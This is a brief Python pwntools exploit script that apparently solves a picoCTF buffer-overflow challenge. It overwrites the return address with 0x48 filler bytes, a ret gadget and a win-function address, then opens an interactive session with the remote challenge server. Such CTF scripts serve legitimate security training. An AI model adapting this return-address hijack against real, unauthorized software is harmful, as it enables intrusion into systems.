from pwn import*

p = remote("saturn.picoctf.net", 63636)
#p = process("./vuln")
#gdb.attach(p,gdbscript='''

ret = 0x000000000040101a
flag = 0x0000000000401236
payload = b"a"*0x48 + p64(ret) + p64(flag)

p.sendline(payload)
p.interactive()
